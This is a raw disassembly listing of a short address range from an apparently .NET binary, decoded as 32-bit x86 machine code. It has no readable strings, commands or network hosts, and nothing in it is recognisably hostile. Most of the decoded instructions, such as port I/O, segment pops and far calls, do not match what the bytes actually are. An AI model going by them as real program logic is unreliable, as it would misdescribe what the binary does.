  405ebb:	00 0a                	add    %cl,(%edx)
  405ebd:	2d 0b 06 72 7f       	sub    $0x7f72060b,%eax
  405ec2:	05 00 70 6f dd       	add    $0xdd6f7000,%eax
  405ec7:	00 00                	add    %al,(%eax)
  405ec9:	0a de                	or     %dh,%bl
  405ecb:	0a 07                	or     (%edi),%al
  405ecd:	2c 06                	sub    $0x6,%al
  405ecf:	07                   	pop    %es
  405ed0:	6f                   	outsl  %ds:(%esi),(%dx)
  405ed1:	4b                   	dec    %ebx
  405ed2:	00 00                	add    %al,(%eax)
  405ed4:	0a dc                	or     %ah,%bl
  405ed6:	72 87                	jb     0x405e5f
  405ed8:	05 00 70 06 28       	add    $0x28067000,%eax
  405edd:	54                   	push   %esp
  405ede:	00 00                	add    %al,(%eax)
  405ee0:	0a 13                	or     (%ebx),%dl
  405ee2:	04 de                	add    $0xde,%al
  405ee4:	23 26                	and    (%esi),%esp
  405ee6:	06                   	push   %es
  405ee7:	6f                   	outsl  %ds:(%esi),(%dx)
  405ee8:	e0 00                	loopne 0x405eea
  405eea:	00 0a                	add    %cl,(%edx)
  405eec:	2d 0b 06 72 7f       	sub    $0x7f72060b,%eax
  405ef1:	05 00 70 6f dd       	add    $0xdd6f7000,%eax
  405ef6:	00 00                	add    %al,(%eax)
  405ef8:	0a 72 87             	or     -0x79(%edx),%dh
  405efb:	05 00 70 06 28       	add    $0x28067000,%eax
  405f00:	54                   	push   %esp
  405f01:	00 00                	add    %al,(%eax)
  405f03:	0a 13                	or     (%ebx),%dl
  405f05:	04 de                	add    $0xde,%al
  405f07:	00 11                	add    %dl,(%ecx)
  405f09:	04 2a                	add    $0x2a,%al
  405f0b:	00 01                	add    %al,(%ecx)
  405f0d:	28 00                	sub    %al,(%eax)
  405f0f:	00 02                	add    %al,(%edx)
  405f11:	00 31                	add    %dh,(%ecx)
  405f13:	00 38                	add    %bh,(%eax)
  405f15:	69 00 0a 00 00 00    	imul   $0xa,(%eax),%eax
  405f1b:	00 02                	add    %al,(%edx)
  405f1d:	00 25 00 63 88 00    	add    %ah,0x886300
  405f23:	0a 00                	or     (%eax),%al
  405f25:	00 00                	add    %al,(%eax)
  405f27:	00 00                	add    %al,(%eax)
  405f29:	00 06                	add    %al,(%esi)
  405f2b:	00 9b a1 00 23 01    	add    %bl,0x12300a1(%ebx)
  405f31:	00 00                	add    %al,(%eax)
  405f33:	01 1b                	add    %ebx,(%ebx)
  405f35:	30 04 00             	xor    %al,(%eax,%eax,1)
  405f38:	86 00                	xchg   %al,(%eax)
  405f3a:	00 00                	add    %al,(%eax)
  405f3c:	31 00                	xor    %eax,(%eax)
  405f3e:	00 11                	add    %dl,(%ecx)
  405f40:	72 ed                	jb     0x405f2f
  405f42:	04 00                	add    $0x0,%al
  405f44:	70 0a                	jo     0x405f50
  405f46:	72 8d                	jb     0x405ed5
  405f48:	05 00 70 73 e1       	add    $0xe1737000,%eax
  405f4d:	00 00                	add    %al,(%eax)
  405f4f:	0a 0b                	or     (%ebx),%cl
  405f51:	07                   	pop    %es
  405f52:	6f                   	outsl  %ds:(%esi),(%dx)
  405f53:	d8 00                	fadds  (%eax)
  405f55:	00 0a                	add    %cl,(%edx)
  405f57:	0c 08                	or     $0x8,%al
  405f59:	2c 5d                	sub    $0x5d,%al
  405f5b:	08 6f d9             	or     %ch,-0x27(%edi)
  405f5e:	00 00                	add    %al,(%eax)
  405f60:	0a 0d 2b 3a 09 6f    	or     0x6f093a2b,%cl
  405f66:	da 00                	fiaddl (%eax)
  405f68:	00 0a                	add    %cl,(%edx)
  405f6a:	74 68                	je     0x405fd4
  405f6c:	00 00                	add    %al,(%eax)
  405f6e:	01 13                	add    %edx,(%ebx)
  405f70:	04 11                	add    $0x11,%al
  405f72:	04 72                	add    $0x72,%al
  405f74:	d5 05                	aad    $0x5
  405f76:	00 70 6f             	add    %dh,0x6f(%eax)
  405f79:	e2 00                	loop   0x405f7b
  405f7b:	00 0a                	add    %cl,(%edx)
  405f7d:	6f                   	outsl  %ds:(%esi),(%dx)
  405f7e:	59                   	pop    %ecx
  405f7f:	00 00                	add    %al,(%eax)
  405f81:	0a 72 ef             	or     -0x11(%edx),%dh
  405f84:	04 00                	add    $0x0,%al
  405f86:	70 11                	jo     0x405f99
  405f88:	04 72                	add    $0x72,%al
  405f8a:	e5 05                	in     $0x5,%eax
  405f8c:	00 70 6f             	add    %dh,0x6f(%eax)
  405f8f:	e2 00                	loop   0x405f91
  405f91:	00 0a                	add    %cl,(%edx)
  405f93:	6f                   	outsl  %ds:(%esi),(%dx)
  405f94:	59                   	pop    %ecx
  405f95:	00 00                	add    %al,(%eax)
  405f97:	0a 28                	or     (%eax),%ch
  405f99:	65 00 00             	add    %al,%gs:(%eax)
  405f9c:	0a 0a                	or     (%edx),%cl
  405f9e:	09 6f df             	or     %ebp,-0x21(%edi)
  405fa1:	00 00                	add    %al,(%eax)
  405fa3:	0a 2d be de 0a 09    	or     0x90adebe,%ch
  405fa9:	2c 06                	sub    $0x6,%al
  405fab:	09 6f 4b             	or     %ebp,0x4b(%edi)
  405fae:	00 00                	add    %al,(%eax)
  405fb0:	0a dc                	or     %ah,%bl
  405fb2:	08 6f e3             	or     %ch,-0x1d(%edi)
  405fb5:	00 00                	add    %al,(%eax)
  405fb7:	0a de                	or     %dh,%bl
  405fb9:	0a 07                	or     (%edi),%al
  405fbb:	2c 06                	sub    $0x6,%al
  405fbd:	07                   	pop    %es
  405fbe:	6f                   	outsl  %ds:(%esi),(%dx)
  405fbf:	4b                   	dec    %ebx
  405fc0:	00 00                	add    %al,(%eax)
  405fc2:	0a dc                	or     %ah,%bl
  405fc4:	06                   	push   %es
  405fc5:	2a 00                	sub    (%eax),%al
  405fc7:	00 01                	add    %al,(%ecx)
  405fc9:	1c 00                	sbb    $0x0,%al
  405fcb:	00 02                	add    %al,(%edx)
  405fcd:	00 22                	add    %ah,(%edx)
  405fcf:	00 46 68             	add    %al,0x68(%esi)
  405fd2:	00 0a                	add    %cl,(%edx)
  405fd4:	00 00                	add    %al,(%eax)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	02 00                	add    (%eax),%al
  405fda:	11 00                	adc    %eax,(%eax)
  405fdc:	69 7a 00 0a 00 00 00 	imul   $0xa,0x0(%edx),%edi
  405fe3:	00 1b                	add    %bl,(%ebx)
  405fe5:	30 04 00             	xor    %al,(%eax,%eax,1)
  405fe8:	5f                   	pop    %edi
  405fe9:	00 00                	add    %al,(%eax)
  405feb:	00 32                	add    %dh,(%edx)
  405fed:	00 00                	add    %al,(%eax)
  405fef:	11 1b                	adc    %ebx,(%ebx)
  405ff1:	8d 01                	lea    (%ecx),%eax
  405ff3:	00 00                	add    %al,(%eax)
  405ff5:	01 25 16 28 e4 00    	add    %esp,0xe42816
  405ffb:	00 0a                	add    %cl,(%edx)
  405ffd:	8c 69 00             	mov    %gs,0x0(%ecx)
  406000:	00 01                	add    %al,(%ecx)
  406002:	a2 25 17 28 5a       	mov    %al,0x5a281725
  406007:	00 00                	add    %al,(%eax)
  406009:	0a a2 25 18 28 d6    	or     -0x29d7e7db(%edx),%ah
  40600f:	00 00                	add    %al,(%eax)
  406011:	0a a2 25 19 28 e5    	or     -0x1ad7e6db(%edx),%ah
  406017:	00 00                	add    %al,(%eax)
  406019:	0a a2 25 1a 28 e6    	or     -0x19d7e5db(%edx),%ah
  40601f:	00 00                	add    %al,(%eax)
  406021:	0a 28                	or     (%eax),%ch
  406023:	e7 00                	out    %eax,$0x0
  406025:	00 0a                	add    %cl,(%edx)
  406027:	73 e8                	jae    0x406011
  406029:	00 00                	add    %al,(%eax)
  40602b:	0a 28                	or     (%eax),%ch
  40602d:	e9 00 00 0a 8c       	jmp    0x8c4a6032
  406032:	6c                   	insb   (%dx),%es:(%edi)
  406033:	00 00                	add    %al,(%eax)
  406035:	01 a2 28 ea 00 00    	add    %esp,0xea28(%edx)
  40603b:	0a 28                	or     (%eax),%ch
  40603d:	74 00                	je     0x40603f
  40603f:	00 06                	add    %al,(%esi)
  406041:	0a de                	or     %dh,%bl
  406043:	09 26                	or     %esp,(%esi)
  406045:	72 03                	jb     0x40604a
  406047:	06                   	push   %es
  406048:	00 70 0a             	add    %dh,0xa(%eax)
  40604b:	de 00                	fiadds (%eax)
  40604d:	06                   	push   %es
  40604e:	2a 00                	sub    (%eax),%al
  406050:	01 10                	add    %edx,(%eax)
  406052:	00 00                	add    %al,(%eax)
  406054:	00 00                	add    %al,(%eax)
  406056:	00 00                	add    %al,(%eax)
  406058:	54                   	push   %esp
  406059:	54                   	push   %esp
  40605a:	00 09                	add    %cl,(%ecx)
  40605c:	01 00                	add    %eax,(%eax)
  40605e:	00 01                	add    %al,(%ecx)
  406060:	13 30                	adc    (%eax),%esi
  406062:	03 00                	add    (%eax),%eax
  406064:	5a                   	pop    %edx
  406065:	00 00                	add    %al,(%eax)
  406067:	00 33                	add    %dh,(%ebx)
  406069:	00 00                	add    %al,(%eax)
  40606b:	11 73 eb             	adc    %esi,-0x15(%ebx)
  40606e:	00 00                	add    %al,(%eax)
  406070:	0a 28                	or     (%eax),%ch
  406072:	ec                   	in     (%dx),%al
  406073:	00 00                	add    %al,(%eax)
  406075:	0a 02                	or     (%edx),%al
  406077:	6f                   	outsl  %ds:(%esi),(%dx)
  406078:	3b 00                	cmp    (%eax),%eax
  40607a:	00 0a                	add    %cl,(%edx)
  40607c:	0a 06                	or     (%esi),%al
  40607e:	6f                   	outsl  %ds:(%esi),(%dx)
  40607f:	ed                   	in     (%dx),%eax
  406080:	00 00                	add    %al,(%eax)
  406082:	0a 0a                	or     (%edx),%cl
  406084:	73 b7                	jae    0x40603d
  406086:	00 00                	add    %al,(%eax)
  406088:	0a 0b                	or     (%ebx),%cl
  40608a:	06                   	push   %es
  40608b:	0c 16                	or     $0x16,%al
  40608d:	0d 2b 1c 08 09       	or     $0x9081c2b,%eax
  406092:	91                   	xchg   %eax,%ecx
  406093:	13 04 07             	adc    (%edi,%eax,1),%eax
  406096:	12 04 72             	adc    (%edx,%esi,2),%al
  406099:	13 06                	adc    (%esi),%eax
  40609b:	00 70 28             	add    %dh,0x28(%eax)
  40609e:	ee                   	out    %al,(%dx)
  40609f:	00 00                	add    %al,(%eax)
  4060a1:	0a 6f ef             	or     -0x11(%edi),%ch
  4060a4:	00 00                	add    %al,(%eax)
  4060a6:	0a 26                	or     (%esi),%ah
  4060a8:	09 17                	or     %edx,(%edi)
  4060aa:	58                   	pop    %eax
  4060ab:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4060b0:	32 de                	xor    %dh,%bl
  4060b2:	07                   	pop    %es
  4060b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4060b4:	59                   	pop    %ecx
  4060b5:	00 00                	add    %al,(%eax)
  4060b7:	0a 16                	or     (%esi),%dl
  4060b9:	1f                   	pop    %ds
  4060ba:	14 6f                	adc    $0x6f,%al
  4060bc:	f0 00 00             	lock add %al,(%eax)
  4060bf:	0a 6f f1             	or     -0xf(%edi),%ch
  4060c2:	00 00                	add    %al,(%eax)
  4060c4:	0a 2a                	or     (%edx),%ch
  4060c6:	00 00                	add    %al,(%eax)
  4060c8:	13 30                	adc    (%eax),%esi
  4060ca:	02 00                	add    (%eax),%al
  4060cc:	58                   	pop    %eax
  4060cd:	00 00                	add    %al,(%eax)
  4060cf:	00 34 00             	add    %dh,(%eax,%eax,1)
  4060d2:	00 11                	add    %dl,(%ecx)
  4060d4:	12 00                	adc    (%eax),%al
  4060d6:	28 70 00             	sub    %dh,0x0(%eax)
  4060d9:	00 0a                	add    %cl,(%edx)
  4060db:	7d ba                	jge    0x406097
  4060dd:	00 00                	add    %al,(%eax)
  4060df:	04 12                	add    $0x12,%al
  4060e1:	00 02                	add    %al,(%edx)
  4060e3:	7d bb                	jge    0x4060a0
  4060e5:	00 00                	add    %al,(%eax)
  4060e7:	04 12                	add    $0x12,%al
  4060e9:	00 03                	add    %al,(%ebx)
  4060eb:	7d bc                	jge    0x4060a9
  4060ed:	00 00                	add    %al,(%eax)
  4060ef:	04 12                	add    $0x12,%al
  4060f1:	00 04 7d be 00 00 04 	add    %al,0x40000be(,%edi,2)
  4060f8:	12 00                	adc    (%eax),%al
  4060fa:	05 7d bf 00 00       	add    $0xbf7d,%eax
  4060ff:	04 12                	add    $0x12,%al
  406101:	00 0e                	add    %cl,(%esi)
  406103:	04 7d                	add    $0x7d,%al
  406105:	bd 00 00 04 12       	mov    $0x12040000,%ebp
  40610a:	00 15 7d b9 00 00    	add    %dl,0xb97d
  406110:	04 12                	add    $0x12,%al
  406112:	00 7c ba 00          	add    %bh,0x0(%edx,%edi,4)
  406116:	00 04 12             	add    %al,(%edx,%edx,1)
  406119:	00 28                	add    %ch,(%eax)
  40611b:	3e 00 00             	add    %al,%ds:(%eax)
  40611e:	2b 12                	sub    (%edx),%edx
  406120:	00 7c ba 00          	add    %bh,0x0(%edx,%edi,4)
  406124:	00 04 28             	add    %al,(%eax,%ebp,1)
  406127:	72 00                	jb     0x406129
  406129:	00 0a                	add    %cl,(%edx)
  40612b:	2a 13                	sub    (%ebx),%dl
  40612d:	30 02                	xor    %al,(%edx)
  40612f:	00 37                	add    %dh,(%edi)
  406131:	00 00                	add    %al,(%eax)
  406133:	00 35 00 00 11 12    	add    %dh,0x12110000
  406139:	00 28                	add    %ch,(%eax)
  40613b:	1b 00                	sbb    (%eax),%eax
  40613d:	00 0a                	add    %cl,(%edx)
  40613f:	7d c9                	jge    0x40610a
  406141:	00 00                	add    %al,(%eax)
  406143:	04 12                	add    $0x12,%al
  406145:	00 02                	add    %al,(%edx)
  406147:	7d ca                	jge    0x406113
  406149:	00 00                	add    %al,(%eax)
  40614b:	04 12                	add    $0x12,%al
  40614d:	00 15 7d c8 00 00    	add    %dl,0xc87d
  406153:	04 12                	add    $0x12,%al
  406155:	00 7c c9 00          	add    %bh,0x0(%ecx,%ecx,8)
  406159:	00 04 12             	add    %al,(%edx,%edx,1)
  40615c:	00 28                	add    %ch,(%eax)
  40615e:	3f                   	aas
  40615f:	00 00                	add    %al,(%eax)
  406161:	2b 12                	sub    (%edx),%edx
  406163:	00 7c c9 00          	add    %bh,0x0(%ecx,%ecx,8)
  406167:	00 04 28             	add    %al,(%eax,%ebp,1)
  40616a:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  40616f:	00 13                	add    %dl,(%ebx)
  406171:	30 02                	xor    %al,(%edx)
  406173:	00 2f                	add    %ch,(%edi)
  406175:	00 00                	add    %al,(%eax)
  406177:	00 36                	add    %dh,(%esi)
  406179:	00 00                	add    %al,(%eax)
  40617b:	11 12                	adc    %edx,(%edx)
  40617d:	00 28                	add    %ch,(%eax)
  40617f:	1b 00                	sbb    (%eax),%eax
  406181:	00 0a                	add    %cl,(%edx)
  406183:	7d cd                	jge    0x406152
  406185:	00 00                	add    %al,(%eax)
  406187:	04 12                	add    $0x12,%al
  406189:	00 15 7d cc 00 00    	add    %dl,0xcc7d
  40618f:	04 12                	add    $0x12,%al
  406191:	00 7c cd 00          	add    %bh,0x0(%ebp,%ecx,8)
  406195:	00 04 12             	add    %al,(%edx,%edx,1)
  406198:	00 28                	add    %ch,(%eax)
  40619a:	40                   	inc    %eax
  40619b:	00 00                	add    %al,(%eax)
  40619d:	2b 12                	sub    (%edx),%edx
  40619f:	00 7c cd 00          	add    %bh,0x0(%ebp,%ecx,8)
  4061a3:	00 04 28             	add    %al,(%eax,%ebp,1)
  4061a6:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  4061ab:	00 13                	add    %dl,(%ebx)
  4061ad:	30 02                	xor    %al,(%edx)
  4061af:	00 3f                	add    %bh,(%edi)
  4061b1:	00 00                	add    %al,(%eax)
  4061b3:	00 37                	add    %dh,(%edi)
  4061b5:	00 00                	add    %al,(%eax)
  4061b7:	11 12                	adc    %edx,(%edx)
  4061b9:	00 28                	add    %ch,(%eax)
  4061bb:	77 00                	ja     0x4061bd
  4061bd:	00 0a                	add    %cl,(%edx)
  4061bf:	7d b5                	jge    0x406176
  4061c1:	00 00                	add    %al,(%eax)
  4061c3:	04 12                	add    $0x12,%al
  4061c5:	00 02                	add    %al,(%edx)
  4061c7:	7d b7                	jge    0x406180
  4061c9:	00 00                	add    %al,(%eax)
  4061cb:	04 12                	add    $0x12,%al
  4061cd:	00 03                	add    %al,(%ebx)
  4061cf:	7d b6                	jge    0x406187
  4061d1:	00 00                	add    %al,(%eax)
  4061d3:	04 12                	add    $0x12,%al
  4061d5:	00 15 7d b4 00 00    	add    %dl,0xb47d
  4061db:	04 12                	add    $0x12,%al
  4061dd:	00 7c b5 00          	add    %bh,0x0(%ebp,%esi,4)
  4061e1:	00 04 12             	add    %al,(%edx,%edx,1)
  4061e4:	00 28                	add    %ch,(%eax)
  4061e6:	41                   	inc    %ecx
  4061e7:	00 00                	add    %al,(%eax)
  4061e9:	2b 12                	sub    (%edx),%edx
  4061eb:	00 7c b5 00          	add    %bh,0x0(%ebp,%esi,4)
  4061ef:	00 04 28             	add    %al,(%eax,%ebp,1)
  4061f2:	79 00                	jns    0x4061f4
  4061f4:	00 0a                	add    %cl,(%edx)
  4061f6:	2a 00                	sub    (%eax),%al
  4061f8:	13 30                	adc    (%eax),%esi
  4061fa:	02 00                	add    (%eax),%al
  4061fc:	3f                   	aas
  4061fd:	00 00                	add    %al,(%eax)
  4061ff:	00 38                	add    %bh,(%eax)
  406201:	00 00                	add    %al,(%eax)
  406203:	11 12                	adc    %edx,(%edx)
  406205:	00 28                	add    %ch,(%eax)
  406207:	77 00                	ja     0x406209
  406209:	00 0a                	add    %cl,(%edx)
  40620b:	7d ae                	jge    0x4061bb
  40620d:	00 00                	add    %al,(%eax)
  40620f:	04 12                	add    $0x12,%al
  406211:	00 02                	add    %al,(%edx)
  406213:	7d af                	jge    0x4061c4
  406215:	00 00                	add    %al,(%eax)
  406217:	04 12                	add    $0x12,%al
  406219:	00 03                	add    %al,(%ebx)
  40621b:	7d b0                	jge    0x4061cd
  40621d:	00 00                	add    %al,(%eax)
  40621f:	04 12                	add    $0x12,%al
  406221:	00 15 7d ad 00 00    	add    %dl,0xad7d
  406227:	04 12                	add    $0x12,%al
  406229:	00 7c ae 00          	add    %bh,0x0(%esi,%ebp,4)
  40622d:	00 04 12             	add    %al,(%edx,%edx,1)
  406230:	00 28                	add    %ch,(%eax)
  406232:	42                   	inc    %edx
  406233:	00 00                	add    %al,(%eax)
  406235:	2b 12                	sub    (%edx),%edx
  406237:	00 7c ae 00          	add    %bh,0x0(%esi,%ebp,4)
  40623b:	00 04 28             	add    %al,(%eax,%ebp,1)
  40623e:	79 00                	jns    0x406240
  406240:	00 0a                	add    %cl,(%edx)
  406242:	2a 00                	sub    (%eax),%al
  406244:	13 30                	adc    (%eax),%esi
  406246:	02 00                	add    (%eax),%al
  406248:	2f                   	das
  406249:	00 00                	add    %al,(%eax)
  40624b:	00 39                	add    %bh,(%ecx)
  40624d:	00 00                	add    %al,(%eax)
  40624f:	11 12                	adc    %edx,(%edx)
  406251:	00 28                	add    %ch,(%eax)
  406253:	f2 00 00             	repnz add %al,(%eax)
  406256:	0a 7d c6             	or     -0x3a(%ebp),%bh
  406259:	00 00                	add    %al,(%eax)
  40625b:	04 12                	add    $0x12,%al
  40625d:	00 15 7d c5 00 00    	add    %dl,0xc57d
  406263:	04 12                	add    $0x12,%al
  406265:	00 7c c6 00          	add    %bh,0x0(%esi,%eax,8)
  406269:	00 04 12             	add    %al,(%edx,%edx,1)
  40626c:	00 28                	add    %ch,(%eax)
  40626e:	43                   	inc    %ebx
  40626f:	00 00                	add    %al,(%eax)
  406271:	2b 12                	sub    (%edx),%edx
  406273:	00 7c c6 00          	add    %bh,0x0(%esi,%eax,8)
  406277:	00 04 28             	add    %al,(%eax,%ebp,1)
  40627a:	f4                   	hlt
  40627b:	00 00                	add    %al,(%eax)
  40627d:	0a 2a                	or     (%edx),%ch
  40627f:	00 13                	add    %dl,(%ebx)
  406281:	30 02                	xor    %al,(%edx)
  406283:	00 2a                	add    %ch,(%edx)
  406285:	00 00                	add    %al,(%eax)
  406287:	00 3a                	add    %bh,(%edx)
  406289:	00 00                	add    %al,(%eax)
  40628b:	11 12                	adc    %edx,(%edx)
  40628d:	00 fe                	add    %bh,%dh
  40628f:	15 20 00 00 02       	adc    $0x2000020,%eax
  406294:	12 00                	adc    (%eax),%al
  406296:	06                   	push   %es
  406297:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40629b:	2b 7d a5             	sub    -0x5b(%ebp),%edi
  40629e:	00 00                	add    %al,(%eax)
  4062a0:	04 12                	add    $0x12,%al
  4062a2:	00 28                	add    %ch,(%eax)
  4062a4:	6c                   	insb   (%dx),%es:(%edi)
  4062a5:	00 00                	add    %al,(%eax)
  4062a7:	06                   	push   %es
  4062a8:	26 28 f6             	es sub %dh,%dh
  4062ab:	00 00                	add    %al,(%eax)
  4062ad:	0a 06                	or     (%esi),%al
  4062af:	7b a6                	jnp    0x406257
  4062b1:	00 00                	add    %al,(%eax)
  4062b3:	04 59                	add    $0x59,%al
  4062b5:	2a 00                	sub    (%eax),%al
  4062b7:	00 1b                	add    %bl,(%ebx)
  4062b9:	30 05 00 65 02 00    	xor    %al,0x26500
  4062bf:	00 3b                	add    %bh,(%ebx)
  4062c1:	00 00                	add    %al,(%eax)
  4062c3:	11 28                	adc    %ebp,(%eax)
  4062c5:	70 00                	jo     0x4062c7
  4062c7:	00 06                	add    %al,(%esi)
  4062c9:	39 ce                	cmp    %ecx,%esi
  4062cb:	01 00                	add    %eax,(%eax)
  4062cd:	00 73 f7             	add    %dh,-0x9(%ebx)
  4062d0:	00 00                	add    %al,(%eax)
  4062d2:	0a 0b                	or     (%ebx),%cl
  4062d4:	07                   	pop    %es
  4062d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4062d6:	f8                   	clc
  4062d7:	00 00                	add    %al,(%eax)
  4062d9:	0a 72 19             	or     0x19(%edx),%dh
  4062dc:	06                   	push   %es
  4062dd:	00 70 6f             	add    %dh,0x6f(%eax)
  4062e0:	f9                   	stc
  4062e1:	00 00                	add    %al,(%eax)
  4062e3:	0a 07                	or     (%edi),%al
  4062e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4062e6:	f8                   	clc
  4062e7:	00 00                	add    %al,(%eax)
  4062e9:	0a 72 33             	or     0x33(%edx),%dh
  4062ec:	06                   	push   %es
  4062ed:	00 70 6f             	add    %dh,0x6f(%eax)
  4062f0:	fa                   	cli
  4062f1:	00 00                	add    %al,(%eax)
  4062f3:	0a 07                	or     (%edi),%al
  4062f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4062f6:	f8                   	clc
  4062f7:	00 00                	add    %al,(%eax)
  4062f9:	0a 16                	or     (%esi),%dl
  4062fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4062fc:	fb                   	sti
  4062fd:	00 00                	add    %al,(%eax)
  4062ff:	0a 07                	or     (%edi),%al
  406301:	6f                   	outsl  %ds:(%esi),(%dx)
  406302:	f8                   	clc
  406303:	00 00                	add    %al,(%eax)
  406305:	0a 17                	or     (%edi),%dl
  406307:	6f                   	outsl  %ds:(%esi),(%dx)
  406308:	fc                   	cld
  406309:	00 00                	add    %al,(%eax)
  40630b:	0a 07                	or     (%edi),%al
  40630d:	6f                   	outsl  %ds:(%esi),(%dx)
  40630e:	f8                   	clc
  40630f:	00 00                	add    %al,(%eax)
  406311:	0a 17                	or     (%edi),%dl
  406313:	6f                   	outsl  %ds:(%esi),(%dx)
  406314:	fd                   	std
  406315:	00 00                	add    %al,(%eax)
  406317:	0a 07                	or     (%edi),%al
  406319:	6f                   	outsl  %ds:(%esi),(%dx)
  40631a:	fe 00                	incb   (%eax)
  40631c:	00 0a                	add    %cl,(%edx)
  40631e:	26 07                	es pop %es
  406320:	6f                   	outsl  %ds:(%esi),(%dx)
  406321:	ff 00                	incl   (%eax)
  406323:	00 0a                	add    %cl,(%edx)
  406325:	6f                   	outsl  %ds:(%esi),(%dx)
  406326:	00 01                	add    %al,(%ecx)
  406328:	00 0a                	add    %cl,(%edx)
  40632a:	0c 07                	or     $0x7,%al
  40632c:	6f                   	outsl  %ds:(%esi),(%dx)
  40632d:	01 01                	add    %eax,(%ecx)
  40632f:	00 0a                	add    %cl,(%edx)
  406331:	de 03                	fiadds (%ebx)
  406333:	26 de 00             	fiadds %es:(%eax)
  406336:	07                   	pop    %es
  406337:	6f                   	outsl  %ds:(%esi),(%dx)
  406338:	d4 00                	aam    $0x0
  40633a:	00 0a                	add    %cl,(%edx)
  40633c:	08 17                	or     %dl,(%edi)
  40633e:	8d 74 00 00          	lea    0x0(%eax,%eax,1),%esi
  406342:	01 25 16 1f 0a 9d    	add    %esp,0x9d0a1f16
  406348:	6f                   	outsl  %ds:(%esi),(%dx)
  406349:	02 01                	add    (%ecx),%al
  40634b:	00 0a                	add    %cl,(%edx)
  40634d:	0d 09 8e 69 17       	or     $0x17698e09,%eax
  406352:	3e 40                	ds inc %eax
  406354:	01 00                	add    %eax,(%eax)
  406356:	00 09                	add    %cl,(%ecx)
  406358:	16                   	push   %ss
  406359:	9a 72 57 06 00 70 72 	lcall  $0x7270,$0x65772
  406360:	ed                   	in     (%dx),%eax
  406361:	04 00                	add    $0x0,%al
  406363:	70 6f                	jo     0x4063d4
  406365:	03 01                	add    (%ecx),%eax
  406367:	00 0a                	add    %cl,(%edx)
  406369:	17                   	pop    %ss
  40636a:	8d 74 00 00          	lea    0x0(%eax,%eax,1),%esi
  40636e:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  406374:	6f                   	outsl  %ds:(%esi),(%dx)
  406375:	02 01                	add    (%ecx),%al
  406377:	00 0a                	add    %cl,(%edx)
  406379:	28 45 00             	sub    %al,0x0(%ebp)
  40637c:	00 2b                	add    %ch,(%ebx)
  40637e:	13 04 11             	adc    (%ecx,%edx,1),%eax
  406381:	04 72                	add    $0x72,%al
  406383:	5b                   	pop    %ebx
  406384:	06                   	push   %es
  406385:	00 70 6f             	add    %dh,0x6f(%eax)
  406388:	04 01                	add    $0x1,%al
  40638a:	00 0a                	add    %cl,(%edx)
  40638c:	13 05 11 04 72 6d    	adc    0x6d720411,%eax
  406392:	06                   	push   %es
  406393:	00 70 6f             	add    %dh,0x6f(%eax)
  406396:	04 01                	add    $0x1,%al
  406398:	00 0a                	add    %cl,(%edx)
  40639a:	13 06                	adc    (%esi),%eax
  40639c:	09 13                	or     %edx,(%ebx)
  40639e:	07                   	pop    %es
  40639f:	16                   	push   %ss
  4063a0:	13 08                	adc    (%eax),%ecx
  4063a2:	38 e5                	cmp    %ah,%ch
  4063a4:	00 00                	add    %al,(%eax)
  4063a6:	00 11                	add    %dl,(%ecx)
  4063a8:	07                   	pop    %es
  4063a9:	11 08                	adc    %ecx,(%eax)
  4063ab:	9a 17 8d 34 00 00 01 	lcall  $0x100,$0x348d17
  4063b2:	25 16 72 85 06       	and    $0x6857216,%eax
  4063b7:	00 70 a2             	add    %dh,-0x5e(%eax)
  4063ba:	16                   	push   %ss
  4063bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4063bc:	05 01 00 0a 13       	add    $0x130a0001,%eax
  4063c1:	09 11                	or     %edx,(%ecx)
  4063c3:	04 6f                	add    $0x6f,%al
  4063c5:	e0 00                	loopne 0x4063c7
  4063c7:	00 0a                	add    %cl,(%edx)
  4063c9:	11 09                	adc    %ecx,(%ecx)
  4063cb:	8e 69 40             	mov    0x40(%ecx),%gs
  4063ce:	b4 00                	mov    $0x0,%ah
  4063d0:	00 00                	add    %al,(%eax)
  4063d2:	11 05 15 3b ac 00    	adc    %eax,0xac3b15
  4063d8:	00 00                	add    %al,(%eax)
  4063da:	11 06                	adc    %eax,(%esi)
  4063dc:	15 3b a4 00 00       	adc    $0xa43b,%eax
  4063e1:	00 11                	add    %dl,(%ecx)
  4063e3:	09 11                	or     %edx,(%ecx)
  4063e5:	06                   	push   %es
  4063e6:	9a 72 57 06 00 70 72 	lcall  $0x7270,$0x65772
  4063ed:	ed                   	in     (%dx),%eax
  4063ee:	04 00                	add    $0x0,%al
  4063f0:	70 6f                	jo     0x406461
  4063f2:	03 01                	add    (%ecx),%eax
  4063f4:	00 0a                	add    %cl,(%edx)
  4063f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4063f7:	06                   	push   %es
  4063f8:	01 00                	add    %eax,(%eax)
  4063fa:	0a 02                	or     (%edx),%al
  4063fc:	7b aa                	jnp    0x4063a8
  4063fe:	00 00                	add    %al,(%eax)
  406400:	04 28                	add    $0x28,%al
  406402:	21 00                	and    %eax,(%eax)
  406404:	00 0a                	add    %cl,(%edx)
  406406:	2c 7e                	sub    $0x7e,%al
  406408:	73 f7                	jae    0x406401
  40640a:	00 00                	add    %al,(%eax)
  40640c:	0a 13                	or     (%ebx),%dl
  40640e:	0a 11                	or     (%ecx),%dl
  406410:	0a 6f f8             	or     -0x8(%edi),%ch
  406413:	00 00                	add    %al,(%eax)
  406415:	0a 72 19             	or     0x19(%edx),%dh
  406418:	06                   	push   %es
  406419:	00 70 6f             	add    %dh,0x6f(%eax)
  40641c:	f9                   	stc
  40641d:	00 00                	add    %al,(%eax)
  40641f:	0a 11                	or     (%ecx),%dl
  406421:	0a 6f f8             	or     -0x8(%edi),%ch
  406424:	00 00                	add    %al,(%eax)
  406426:	0a 72 8d             	or     -0x73(%edx),%dh
  406429:	06                   	push   %es
  40642a:	00 70 11             	add    %dh,0x11(%eax)
  40642d:	09 11                	or     %edx,(%ecx)
  40642f:	05 9a 72 a9 06       	add    $0x6a9729a,%eax
  406434:	00 70 28             	add    %dh,0x28(%eax)
